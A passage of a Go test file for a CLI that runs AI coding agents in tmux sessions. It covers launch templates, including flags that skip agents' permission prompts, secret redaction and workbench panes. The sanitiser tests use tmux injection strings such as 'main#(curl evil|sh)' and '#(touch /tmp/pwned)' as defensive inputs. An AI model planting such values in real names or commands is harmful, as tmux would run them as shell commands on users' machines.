/*
 * Copyright (c) 2026. AXIOM STUDIO AI Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package vibeflowcli

import (
	"os/exec"
	"reflect"
	"strings"
	"testing"
	"unicode"
)

func TestRenderLaunchCommand(t *testing.T) {
	t.Run("empty template", func(t *testing.T) {
		got, err := RenderLaunchCommand("", LaunchTemplateVars{Binary: "claude"})
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if got != "" {
			t.Errorf("expected empty, got %q", got)
		}
	})

	t.Run("basic template", func(t *testing.T) {
		tmpl := "{{.Binary}} --some-flag"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{Binary: "claude"})
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if got != "claude --some-flag" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("skip permissions true", func(t *testing.T) {
		tmpl := "{{.Binary}}{{ if .SkipPermissions }} --dangerously-skip-permissions{{ end }}"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{
			Binary:          "claude",
			SkipPermissions: true,
		})
		if err != nil {
			t.Fatal(err)
		}
		if got != "claude --dangerously-skip-permissions" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("skip permissions false", func(t *testing.T) {
		tmpl := "{{.Binary}}{{ if .SkipPermissions }} --dangerously-skip-permissions{{ end }}"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{
			Binary:          "claude",
			SkipPermissions: false,
		})
		if err != nil {
			t.Fatal(err)
		}
		if got != "claude" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("codex yolo", func(t *testing.T) {
		tmpl := "{{.Binary}}{{ if .SkipPermissions }} --yolo{{ end }}"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{
			Binary:          "codex",
			SkipPermissions: true,
		})
		if err != nil {
			t.Fatal(err)
		}
		if got != "codex --yolo" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("gemini yolo", func(t *testing.T) {
		tmpl := "{{.Binary}}{{ if .SkipPermissions }} --yolo{{ end }}"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{
			Binary:          "gemini",
			SkipPermissions: true,
		})
		if err != nil {
			t.Fatal(err)
		}
		if got != "gemini --yolo" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("cursor agent autonomous flags", func(t *testing.T) {
		tmpl := "{{.Binary}}{{ if .SkipPermissions }} --yolo --approve-mcps{{ end }}"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{
			Binary:          "agent",
			SkipPermissions: true,
		})
		if err != nil {
			t.Fatal(err)
		}
		if got != "agent --yolo --approve-mcps" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("model template quotes shell values", func(t *testing.T) {
		tmpl := "{{.Binary}}{{ if .Model }} --model {{ shellQuote .Model }}{{ end }}"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{
			Binary: "claude",
			Model:  "model with ' quote",
		})
		if err != nil {
			t.Fatal(err)
		}
		if got != "claude --model 'model with '\\'' quote'" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("qwen yolo on", func(t *testing.T) {
		tmpl := "{{.Binary}}{{ if .SkipPermissions }} --yolo{{ end }}"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{
			Binary:          "qwen",
			SkipPermissions: true,
		})
		if err != nil {
			t.Fatal(err)
		}
		if got != "qwen --yolo" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("qwen yolo off", func(t *testing.T) {
		tmpl := "{{.Binary}}{{ if .SkipPermissions }} --yolo{{ end }}"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{
			Binary:          "qwen",
			SkipPermissions: false,
		})
		if err != nil {
			t.Fatal(err)
		}
		if got != "qwen" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("all vars", func(t *testing.T) {
		tmpl := "{{.Binary}} --project={{.Project}} --branch={{.Branch}} --server={{.ServerURL}}"
		got, err := RenderLaunchCommand(tmpl, LaunchTemplateVars{
			Binary:    "agent",
			Project:   "my-project",
			Branch:    "dev",
			ServerURL: "http://localhost:7080",
		})
		if err != nil {
			t.Fatal(err)
		}
		expected := "agent --project=my-project --branch=dev --server=http://localhost:7080"
		if got != expected {
			t.Errorf("got %q, want %q", got, expected)
		}
	})

	t.Run("invalid template", func(t *testing.T) {
		_, err := RenderLaunchCommand("{{.Invalid}", LaunchTemplateVars{})
		if err == nil {
			t.Fatal("expected error for invalid template")
		}
	})
}

func TestFullSessionName(t *testing.T) {
	tm := &TmuxManager{socketName: "vibeflow"}

	t.Run("with provider", func(t *testing.T) {
		got := tm.FullSessionName("claude", "my-session")
		if got != "vibeflow_claude-my-session" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("without provider", func(t *testing.T) {
		got := tm.FullSessionName("", "my-session")
		if got != "vibeflow_my-session" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("codex provider", func(t *testing.T) {
		got := tm.FullSessionName("codex", "feature-branch")
		if got != "vibeflow_codex-feature-branch" {
			t.Errorf("got %q", got)
		}
	})
}

func TestParseSessionProvider(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"claude session", "vibeflow_claude-my-session", "claude"},
		{"codex session", "vibeflow_codex-feature-123", "codex"},
		{"gemini session", "vibeflow_gemini-dev", "gemini"},
		{"cursor session", "vibeflow_cursor-my-agent", "cursor"},
		{"qwen session", "vibeflow_qwen-feature-x", "qwen"},
		{"no provider", "vibeflow_my-session", "my"},
		{"no prefix", "some-session", "some"},
		{"no dash", "vibeflow_nodash", ""},
		{"empty", "", ""},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ParseSessionProvider(tc.input)
			if got != tc.expected {
				t.Errorf("ParseSessionProvider(%q) = %q, want %q", tc.input, got, tc.expected)
			}
		})
	}
}

func TestAtoi(t *testing.T) {
	tests := []struct {
		input    string
		expected int
	}{
		{"0", 0},
		{"1", 1},
		{"42", 42},
		{"100", 100},
		{"abc", 0},
		{"12abc34", 1234},
		{"", 0},
		{"3.14", 314},
	}

	for _, tc := range tests {
		t.Run(tc.input, func(t *testing.T) {
			got := atoi(tc.input)
			if got != tc.expected {
				t.Errorf("atoi(%q) = %d, want %d", tc.input, got, tc.expected)
			}
		})
	}
}

func TestLaunchTemplateVars_Fields(t *testing.T) {
	vars := LaunchTemplateVars{
		WorkDir:         "/work",
		Project:         "proj",
		Branch:          "main",
		ServerURL:       "http://localhost",
		SessionID:       "session-abc",
		SkipPermissions: true,
		Binary:          "claude",
	}

	// Verify all fields are accessible in templates.
	tmpl := "{{.WorkDir}} {{.Project}} {{.Branch}} {{.ServerURL}} {{.SessionID}} {{.SkipPermissions}} {{.Binary}}"
	got, err := RenderLaunchCommand(tmpl, vars)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "/work") {
		t.Error("missing WorkDir")
	}
	if !strings.Contains(got, "session-abc") {
		t.Error("missing SessionID")
	}
	if !strings.Contains(got, "true") {
		t.Error("missing SkipPermissions")
	}
}

func TestEnsurePrefix(t *testing.T) {
	tm := &TmuxManager{socketName: "vibeflow"}

	t.Run("already prefixed", func(t *testing.T) {
		got := tm.ensurePrefix("vibeflow_my-session")
		if got != "vibeflow_my-session" {
			t.Errorf("got %q", got)
		}
	})

	t.Run("not prefixed", func(t *testing.T) {
		got := tm.ensurePrefix("my-session")
		if got != "vibeflow_my-session" {
			t.Errorf("got %q", got)
		}
	})
}

func TestNewTmuxManager_DefaultSocket(t *testing.T) {
	tm := NewTmuxManager("")
	if tm.socketName != "vibeflow" {
		t.Errorf("default socketName = %q, want vibeflow", tm.socketName)
	}
}

func TestNewTmuxManager_CustomSocket(t *testing.T) {
	tm := NewTmuxManager("custom")
	if tm.socketName != "custom" {
		t.Errorf("socketName = %q, want custom", tm.socketName)
	}
}

func TestRedactCommandSecrets(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "sh-quoted key flag is masked",
			in:   `qwen --yolo --openai-api-key 'sk-secret-123' --model 'glm-4.6'`,
			want: `qwen --yolo --openai-api-key <redacted> --model 'glm-4.6'`,
		},
		{
			name: "quoted key with embedded sh-escaped quote is fully masked",
			in:   `qwen --openai-api-key 'weird'\''key' -i 'prompt'`,
			want: `qwen --openai-api-key <redacted> -i 'prompt'`,
		},
		{
			name: "bare (unquoted) key value is masked",
			in:   `qwen --openai-api-key sk-bare-456 --model glm`,
			want: `qwen --openai-api-key <redacted> --model glm`,
		},
		{
			name: "equals form is masked",
			in:   `qwen --openai-api-key=sk-equals-789`,
			want: `qwen --openai-api-key <redacted>`,
		},
		{
			name: "command without key flag is unchanged",
			in:   `qwen --yolo --openai-base-url 'https://api.z.ai/api/coding/paas/v4' -i 'hi'`,
			want: `qwen --yolo --openai-base-url 'https://api.z.ai/api/coding/paas/v4' -i 'hi'`,
		},
		{
			name: "empty command is unchanged",
			in:   "",
			want: "",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := redactCommandSecrets(tc.in); got != tc.want {
				t.Errorf("redactCommandSecrets(%q):\n got:  %q\n want: %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestRedactSpawnArg(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"gemini key env", "GEMINI_API_KEY=abc123", "GEMINI_API_KEY=<redacted>"},
		{"mcp token env", "MCP_TOKEN=tok", "MCP_TOKEN=<redacted>"},
		{"vibeflow token env", "VIBEFLOW_TOKEN=tok", "VIBEFLOW_TOKEN=<redacted>"},
		{"gateway api key env", "GATEWAY_API_KEY=tok", "GATEWAY_API_KEY=<redacted>"},
		{"openai key env", "OPENAI_API_KEY=sk-test", "OPENAI_API_KEY=<redacted>"},
		{
			name: "qwen custom api key env (dynamic endpoint-encoded name)",
			in:   "QWEN_CUSTOM_API_KEY_OPENAI_HTTPS_API_Z_AI_API_PAAS_V4=sk-zai",
			want: "QWEN_CUSTOM_API_KEY_OPENAI_HTTPS_API_Z_AI_API_PAAS_V4=<redacted>",
		},
		{
			name: "anthropic custom headers env (gateway token inside header value)",
			in:   "ANTHROPIC_CUSTOM_HEADERS=x-axiom-api-key: tok-123",
			want: "ANTHROPIC_CUSTOM_HEADERS=<redacted>",
		},
		{"anthropic auth token env", "ANTHROPIC_AUTH_TOKEN=tok", "ANTHROPIC_AUTH_TOKEN=<redacted>"},
		{"anthropic api key env", "ANTHROPIC_API_KEY=sk-ant", "ANTHROPIC_API_KEY=<redacted>"},
		// Deny-by-default (issue #2714): even a non-secret env assignment has its
		// value masked. The NAME survives so support can still see which vars were
		// set; only the value is hidden.
		{"non-secret env value still masked, name survives", "OPENAI_MODEL=glm-4.6", "OPENAI_MODEL=<redacted>"},
		// Regression (issue #2714): a Codex bearer token injected under an arbitrary
		// user-defined name (bearer_token_env_var from ~/.codex/config.toml) cannot
		// be listed in any static allowlist, but deny-by-default masks its value.
		{"codex custom bearer-token env name", "CUSTOM_NAME=tok-abc123", "CUSTOM_NAME=<redacted>"},
		{"plain arg passes through", "-e", "-e"},
		{
			name: "command arg gets key-flag redaction",
			in:   `qwen --openai-api-key 'sk-x' -i 'go'`,
			want: `qwen --openai-api-key <redacted> -i 'go'`,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := redactSpawnArg(tc.in); got != tc.want {
				t.Errorf("redactSpawnArg(%q):\n got:  %q\n want: %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestJoinPaneArgs(t *testing.T) {
	got := joinPaneArgs("vibeflow_claude-a", "vibeflow_workbench")
	want := []string{"join-pane", "-s", "vibeflow_claude-a", "-t", "vibeflow_workbench"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("joinPaneArgs = %v, want %v", got, want)
	}
}

func TestTiledLayoutArgs(t *testing.T) {
	got := tiledLayoutArgs("vibeflow_workbench")
	want := []string{"select-layout", "-t", "vibeflow_workbench", "tiled"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("tiledLayoutArgs = %v, want %v", got, want)
	}
}

func TestWorkbenchHolderName_NoProviderCollision(t *testing.T) {
	if !strings.HasPrefix(workbenchHolderName, sessionPrefix) {
		t.Errorf("holder %q must carry the vibeflow prefix", workbenchHolderName)
	}
	// No provider dash → the holder can never be mistaken for an agent session
	// ("vibeflow_<provider>-<name>").
	if p := ParseSessionProvider(workbenchHolderName); p != "" {
		t.Errorf("holder %q must not parse as a provider session (got %q)", workbenchHolderName, p)
	}
}

func TestComposeWorkbench_TooFewSessions(t *testing.T) {
	// The <2 guard returns before any tmux call, so no server is required.
	tm := NewTmuxManager("vftest-workbench-few")
	if _, err := tm.ComposeWorkbench([]string{"only-one"}, nil); err == nil {
		t.Fatal("expected an error when composing fewer than 2 sessions")
	}
}

// TestComposeWorkbench_RoundTrip exercises the real tmux compose+restore path on
// an isolated throwaway socket: three sessions are joined into one holder window
// and then restored to their own sessions. It proves the restore is
// non-destructive — each session comes back by name with the SAME pane id, so
// the agent process was preserved rather than restarted. Skipped when tmux is
// not installed.
func TestComposeWorkbench_RoundTrip(t *testing.T) {
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not installed")
	}
	tm := NewTmuxManager("vftest-workbench-roundtrip")
	// Guarantee a clean slate and always tear the server down.
	_, _ = tm.run("kill-server")
	defer func() { _, _ = tm.run("kill-server") }()
	if err := tm.EnsureServer(); err != nil {
		t.Skipf("cannot start tmux server: %v", err)
	}

	dir := t.TempDir()
	// Six sessions: this is the count from the issue #3280 report and exceeds
	// the ~3-pane point where the old "tile once at the end" code hit tmux's
	// "create pane failed: pane too small".
	names := []string{"a", "b", "c", "d", "e", "f"}
	full := make([]string, len(names))
	for i, n := range names {
		if err := tm.CreateSessionWithOpts(SessionOpts{
			Name: n, Provider: "claude", WorkDir: dir, Command: "sleep 300",
		}); err != nil {
			t.Fatalf("create session %s: %v", n, err)
		}
		full[i] = tm.FullSessionName("claude", n)
	}

	// Capture each pane id up front to prove the process survives the round trip.
	before := make(map[string]string, len(full))
	for _, fn := range full {
		pid, err := tm.paneID(fn)
		if err != nil {
			t.Fatalf("paneID(%s): %v", fn, err)
		}
		before[fn] = pid
	}

	// Give the first pane a persona/project/branch header and verify it lands in
	// the pane-scoped @vfheader user option (NOT pane_title, which a running
	// agent's OSC title sequences would overwrite).
	wantTitle := "titan · demo · main"
	titles := map[string]string{full[0]: wantTitle}
	comp, err := tm.ComposeWorkbench(full, titles)
	if err != nil {
		t.Fatalf("ComposeWorkbench: %v", err)
	}

	if got, err := tm.run("display-message", "-p", "-t", before[full[0]], "#{@vfheader}"); err != nil {
		t.Errorf("read @vfheader: %v", err)
	} else if strings.TrimSpace(got) != wantTitle {
		t.Errorf("@vfheader = %q, want %q", strings.TrimSpace(got), wantTitle)
	}
	// The border must actually render FROM @vfheader (not pane_title) or the
	// header would be clobbered by the agent's OSC title.
	if got, err := tm.run("show-options", "-w", "-t", comp.HolderName(), "pane-border-format"); err != nil {
		t.Errorf("read pane-border-format: %v", err)
	} else if !strings.Contains(got, "@vfheader") {
		t.Errorf("pane-border-format = %q, want it to reference @vfheader", got)
	}
	// #2721 Option A: heavy borders + active-pane backdrop tint distinguish panes.
	if got, err := tm.run("show-options", "-w", "-t", comp.HolderName(), "-v", "pane-border-lines"); err != nil {
		t.Errorf("read pane-border-lines: %v", err)
	} else if strings.TrimSpace(got) != "heavy" {
		t.Errorf("pane-border-lines = %q, want heavy", strings.TrimSpace(got))
	}
	if got, err := tm.run("show-options", "-w", "-t", comp.HolderName(), "-v", "window-active-style"); err != nil {
		t.Errorf("read window-active-style: %v", err)
	} else if !strings.Contains(got, oceanHexShallow) {
		t.Errorf("window-active-style = %q, want it to tint bg with %s", got, oceanHexShallow)
	}

	// join-pane MOVES panes, so the source sessions are consumed by the compose.
	for _, fn := range full {
		if tm.HasSession(fn) {
			t.Errorf("source session %s should be consumed by compose", fn)
		}
	}
	if !tm.HasSession(comp.HolderName()) {
		t.Fatalf("holder %s missing after compose", comp.HolderName())
	}
	// Holder holds exactly one pane per source (the placeholder was dropped).
	out, err := tm.run("list-panes", "-t", comp.HolderName(), "-F", "#{pane_id}")
	if err != nil {
		t.Fatalf("list-panes holder: %v", err)
	}
	if got := len(strings.Fields(out)); got != len(full) {
		t.Errorf("holder pane count = %d, want %d:\n%s", got, len(full), out)
	}

	if err := comp.Restore(); err != nil {
		t.Fatalf("Restore: %v", err)
	}

	// Holder is gone; every source is back by name with its ORIGINAL pane id.
	if tm.HasSession(comp.HolderName()) {
		t.Errorf("holder %s should be destroyed after restore", comp.HolderName())
	}
	for _, fn := range full {
		if !tm.HasSession(fn) {
			t.Errorf("session %s was not restored", fn)
			continue
		}
		pid, err := tm.paneID(fn)
		if err != nil {
			t.Errorf("paneID(%s) after restore: %v", fn, err)
			continue
		}
		if pid != before[fn] {
			t.Errorf("session %s pane id changed %s -> %s (process not preserved)", fn, before[fn], pid)
		}
	}
}

func TestWorkbenchPaneTitle(t *testing.T) {
	if got := workbenchPaneTitle("vibeflow_claude-a"); got != "claude-a" {
		t.Errorf("workbenchPaneTitle = %q, want claude-a", got)
	}
	if got := workbenchPaneTitle("plain"); got != "plain" {
		t.Errorf("workbenchPaneTitle(unprefixed) = %q, want plain", got)
	}
}

func TestWorkbenchHeader(t *testing.T) {
	tests := []struct {
		name                     string
		persona, project, branch string
		want                     string
	}{
		{"all present", "principal_engineer", "vibeflow-cli", "main", "principal_engineer · vibeflow-cli · main"},
		{"missing persona", "", "vibeflow-cli", "main", "vibeflow-cli · main"},
		{"missing branch", "titan", "demo", "", "titan · demo"},
		{"only project", "", "solo", "", "solo"},
		{"all empty", "", "", "", ""},
		{"whitespace trimmed", "  titan ", " demo ", " main ", "titan · demo · main"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := workbenchHeader(tt.persona, tt.project, tt.branch); got != tt.want {
				t.Errorf("workbenchHeader(%q,%q,%q) = %q, want %q", tt.persona, tt.project, tt.branch, got, tt.want)
			}
		})
	}
}

// TestWorkbenchHints_AdvertiseSessionNavigation guards that both workbench
// status-bar hints advertise the keyboard shortcut for moving between session
// panes, and that they stay within the status-left-length budget (220).
func TestWorkbenchHints_AdvertiseSessionNavigation(t *testing.T) {
	for name, hint := range map[string]string{"single": workbenchHintSingle, "multi": workbenchHintMulti} {
		if !strings.Contains(hint, "Ctrl-t") || !strings.Contains(hint, "switch session") {
			t.Errorf("%s hint must advertise Ctrl-t session navigation, got %q", name, hint)
		}
		if strings.Contains(hint, "Ctrl-b o") {
			t.Errorf("%s hint must not advertise the removed (non-working) Ctrl-b o, got %q", name, hint)
		}
		if len(hint) > 220 {
			t.Errorf("%s hint length %d exceeds status-left-length 220", name, len(hint))
		}
	}
	if !strings.Contains(workbenchHintMulti, "next / prev project") {
		t.Errorf("multi hint must still advertise project switching, got %q", workbenchHintMulti)
	}
}

// TestBindWorkbenchNavKeys installs the Ctrl-t pane-navigation binding and
// verifies it lands in the tmux root key table, guarded so single-pane windows
// pass the key through to the agent. Skipped when tmux is absent.
func TestBindWorkbenchNavKeys(t *testing.T) {
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not installed")
	}
	tm := NewTmuxManager("vftest-wbnavkeys")
	_, _ = tm.run("kill-server")
	defer func() { _, _ = tm.run("kill-server") }()
	if err := tm.EnsureServer(); err != nil {
		t.Skipf("cannot start tmux server: %v", err)
	}
	// A session must exist for the tmux server to persist and accept bindings
	// (in production bindWorkbenchNavKeys runs after the workbench holder exists).
	if _, err := tm.run("new-session", "-d", "-s", "navkeys-holder"); err != nil {
		t.Skipf("cannot create tmux session: %v", err)
	}

	tm.bindWorkbenchNavKeys()

	out, err := tm.run("list-keys", "-T", "root")
	if err != nil {
		t.Fatalf("list-keys: %v", err)
	}
	if !strings.Contains(out, "C-t") {
		t.Errorf("root key table missing C-t binding:\n%s", out)
	}
	// The guard scopes pane-switching to multi-pane windows; single-pane windows
	// (a directly-attached agent) pass the key through so the agent keeps Ctrl-t.
	if !strings.Contains(out, "window_panes") {
		t.Errorf("nav binding must be guarded by window_panes>1:\n%s", out)
	}
	if !strings.Contains(out, "send-keys") {
		t.Errorf("nav binding must pass the key through on single-pane windows:\n%s", out)
	}

	// #3321: a single left click in a multi-pane workbench must focus the pane
	// under the pointer WITHOUT tmux's default `send -M` pass-through, so one
	// click reliably focuses it; single-pane windows keep the pass-through.
	var mouseLine string
	for _, l := range strings.Split(out, "\n") {
		if strings.Contains(l, "MouseDown1Pane") {
			mouseLine = l
			break
		}
	}
	if mouseLine == "" {
		t.Fatalf("root key table missing MouseDown1Pane binding:\n%s", out)
	}
	if !strings.Contains(mouseLine, "window_panes") {
		t.Errorf("MouseDown1Pane must be guarded by window_panes>1: %q", mouseLine)
	}
	if !strings.Contains(mouseLine, "select-pane") {
		t.Errorf("MouseDown1Pane must select the pane under the pointer: %q", mouseLine)
	}
	if !strings.Contains(mouseLine, "send-keys -M") {
		t.Errorf("MouseDown1Pane single-pane branch must pass the mouse through: %q", mouseLine)
	}
}

// TestConfigureWorkbenchChrome_StatusPositionTop guards #3299: the workbench
// status line is placed at the top so the pane grid starts on row 1 and the
// top-row panes' headers aren't clipped by VS Code's terminal. Skipped when
// tmux is absent.
func TestConfigureWorkbenchChrome_StatusPositionTop(t *testing.T) {
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not installed")
	}
	tm := NewTmuxManager("vftest-chrome")
	_, _ = tm.run("kill-server")
	defer func() { _, _ = tm.run("kill-server") }()
	if err := tm.EnsureServer(); err != nil {
		t.Skipf("cannot start tmux server: %v", err)
	}
	if _, err := tm.run("new-session", "-d", "-s", "chrome-holder"); err != nil {
		t.Skipf("cannot create tmux session: %v", err)
	}
	tm.configureWorkbenchChrome("chrome-holder", workbenchHintSingle)
	out, err := tm.run("show-options", "-t", "chrome-holder", "-v", "status-position")
	if err != nil {
		t.Fatalf("show status-position: %v", err)
	}
	if strings.TrimSpace(out) != "top" {
		t.Errorf("status-position = %q, want \"top\" (#3299)", strings.TrimSpace(out))
	}
}

// TestIsWorkbenchHolder guards #3300: the internal workbench holder session is
// recognized (and thus excluded from the TUI session list) while real agent
// sessions are not.
func TestIsWorkbenchHolder(t *testing.T) {
	if !isWorkbenchHolder(workbenchHolderName) {
		t.Errorf("workbench holder %q must be recognized", workbenchHolderName)
	}
	for _, name := range []string{"vibeflow_claude-a", "vibeflow_codex-b", "vibeflow_workbench-x", "vibeflow_myworkbench"} {
		if isWorkbenchHolder(name) {
			t.Errorf("%q must not be treated as the workbench holder", name)
		}
	}
}

// TestComposeProjectWorkbench_RoundTrip exercises the multi-window (Option A)
// compose: two projects, each a window of two panes, then a non-destructive
// restore. Skipped when tmux is absent.
func TestComposeProjectWorkbench_RoundTrip(t *testing.T) {
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not installed")
	}
	tm := NewTmuxManager("vftest-projwb-roundtrip")
	_, _ = tm.run("kill-server")
	defer func() { _, _ = tm.run("kill-server") }()
	if err := tm.EnsureServer(); err != nil {
		t.Skipf("cannot start tmux server: %v", err)
	}

	dir := t.TempDir()
	mk := func(n string) string {
		if err := tm.CreateSessionWithOpts(SessionOpts{
			Name: n, Provider: "claude", WorkDir: dir, Command: "sleep 300",
		}); err != nil {
			t.Fatalf("create session %s: %v", n, err)
		}
		return tm.FullSessionName("claude", n)
	}
	a1, a2, b1, b2 := mk("a1"), mk("a2"), mk("b1"), mk("b2")
	all := []string{a1, a2, b1, b2}

	before := make(map[string]string, len(all))
	for _, s := range all {
		pid, err := tm.paneID(s)
		if err != nil {
			t.Fatalf("paneID(%s): %v", s, err)
		}
		before[s] = pid
	}

	projects := []WorkbenchProject{
		{Label: "alpha", Sessions: []string{a1, a2}},
		{Label: "beta", Sessions: []string{b1, b2}},
	}
	comp, err := tm.ComposeProjectWorkbench(projects, "beta", nil)
	if err != nil {
		t.Fatalf("ComposeProjectWorkbench: %v", err)
	}

	for _, s := range all {
		if tm.HasSession(s) {
			t.Errorf("source session %s should be consumed by compose", s)
		}
	}
	wins, err := tm.run("list-windows", "-t", comp.HolderName(), "-F", "#{window_name}")
	if err != nil {
		t.Fatalf("list-windows: %v", err)
	}
	if got := len(strings.Fields(wins)); got != 2 {
		t.Errorf("holder windows = %d, want 2:\n%s", got, wins)
	}
	for _, w := range []string{"alpha", "beta"} {
		out, err := tm.run("list-panes", "-t", comp.HolderName()+":"+w, "-F", "#{pane_id}")
		if err != nil {
			t.Fatalf("list-panes %s: %v", w, err)
		}
		if got := len(strings.Fields(out)); got != 2 {
			t.Errorf("window %s panes = %d, want 2:\n%s", w, got, out)
		}
	}

	if err := comp.Restore(); err != nil {
		t.Fatalf("Restore: %v", err)
	}
	if tm.HasSession(comp.HolderName()) {
		t.Errorf("holder %s should be destroyed after restore", comp.HolderName())
	}
	for _, s := range all {
		if !tm.HasSession(s) {
			t.Errorf("session %s was not restored", s)
			continue
		}
		pid, err := tm.paneID(s)
		if err != nil {
			t.Errorf("paneID(%s) after restore: %v", s, err)
			continue
		}
		if pid != before[s] {
			t.Errorf("session %s pane id changed %s -> %s (process not preserved)", s, before[s], pid)
		}
	}
}

func TestIsSecretEnvKey(t *testing.T) {
	tests := []struct {
		key  string
		want bool
	}{
		{"GEMINI_API_KEY", true},
		{"MCP_TOKEN", true},
		{"VIBEFLOW_TOKEN", true},
		{"GATEWAY_API_KEY", true},
		{"OPENAI_API_KEY", true},
		{"ANTHROPIC_CUSTOM_HEADERS", true},
		{"ANTHROPIC_AUTH_TOKEN", true},
		{"ANTHROPIC_API_KEY", true},
		{"QWEN_CUSTOM_API_KEY_OPENAI_HTTPS_API_Z_AI_API_PAAS_V4", true},
		{"OPENAI_BASE_URL", false},
		{"ANTHROPIC_BASE_URL", false},
		{"OPENAI_MODEL", false},
		{"OPENAI_API_KEY_EXTRA", false},
		{"PATH", false},
	}
	for _, tc := range tests {
		if got := isSecretEnvKey(tc.key); got != tc.want {
			t.Errorf("isSecretEnvKey(%q) = %v, want %v", tc.key, got, tc.want)
		}
	}
}

// TestSanitizeTmuxStatusValue verifies the #3289 remediation: externally-sourced
// values interpolated into a tmux status format have their '#' escaped to '##'
// (so tmux never executes "#(...)" or expands "#{...}"/"#[...]"), control chars
// dropped, and length clamped.
func TestSanitizeTmuxStatusValue(t *testing.T) {
	cases := []struct{ name, in, want string }{
		{"command-sub", "main#(curl evil|sh)", "main##(curl evil|sh)"},
		{"format-expand", "a#{x}b", "a##{x}b"},
		{"style", "c#[fg]d", "c##[fg]d"},
		{"plain", "feature/foo", "feature/foo"},
		{"hash-literal", "feat#123", "feat##123"},
		{"control-chars", "a\nb\x1bc\x7fd", "abcd"},
	}
	for _, tc := range cases {
		if got := sanitizeTmuxStatusValue(tc.in); got != tc.want {
			t.Errorf("%s: sanitizeTmuxStatusValue(%q)=%q, want %q", tc.name, tc.in, got, tc.want)
		}
	}
	// No live "#(" command-substitution survives (escaped "##" collapses to a literal '#').
	if got := sanitizeTmuxStatusValue("x#(touch /tmp/pwned)"); strings.Contains(strings.ReplaceAll(got, "##", ""), "#(") {
		t.Errorf("sanitized value still has a live #(: %q", got)
	}
	// Length is clamped (defence against an over-long branch flooding the status line).
	if got := sanitizeTmuxStatusValue(strings.Repeat("x", 100)); len(got) != 64 {
		t.Errorf("clamp: got len %d, want 64", len(got))
	}
}

// TestConfigureStatusBar_EscapesInjection proves the fix end-to-end: a git branch
// / project name carrying a "#(shell-command)" lands in the tmux status-left /
// status-right with no live "#(" that tmux would execute. Skipped when tmux is
// absent.
func TestConfigureStatusBar_EscapesInjection(t *testing.T) {
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not installed")
	}
	tm := NewTmuxManager("vftest-statusinj")
	_, _ = tm.run("kill-server")
	defer func() { _, _ = tm.run("kill-server") }()
	if err := tm.EnsureServer(); err != nil {
		t.Skipf("cannot start tmux server: %v", err)
	}
	if _, err := tm.run("new-session", "-d", "-s", "vibeflow_inj"); err != nil {
		t.Skipf("cannot create tmux session: %v", err)
	}
	if err := tm.ConfigureStatusBar("vibeflow_inj", StatusBarOpts{
		Provider: "claude",
		Branch:   "main#(touch /tmp/vf_should_not_exist)",
		Project:  "proj#(id)",
	}); err != nil {
		t.Fatalf("ConfigureStatusBar: %v", err)
	}
	for _, opt := range []string{"status-left", "status-right"} {
		out, err := tm.run("show-options", "-t", "vibeflow_inj", opt)
		if err != nil {
			t.Fatalf("show-options %s: %v", opt, err)
		}
		// After collapsing the escaped "##", no live "#(" may remain (tmux would
		// otherwise run it as a shell command on every status refresh).
		if strings.Contains(strings.ReplaceAll(out, "##", ""), "#(") {
			t.Errorf("%s has a live #( command-substitution: %q", opt, out)
		}
	}
}

// TestWorkbenchRestore_PartialFailureKeepsStrandedPane verifies the #3277 fix: a
// per-source Restore failure must NOT let the trailing kill-session destroy the
// stranded agent pane. It injects a real failure via a session-name collision.
// Skipped when tmux is absent.
func TestWorkbenchRestore_PartialFailureKeepsStrandedPane(t *testing.T) {
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not installed")
	}
	tm := NewTmuxManager("vftest-restore-partial")
	_, _ = tm.run("kill-server")
	defer func() { _, _ = tm.run("kill-server") }()
	if err := tm.EnsureServer(); err != nil {
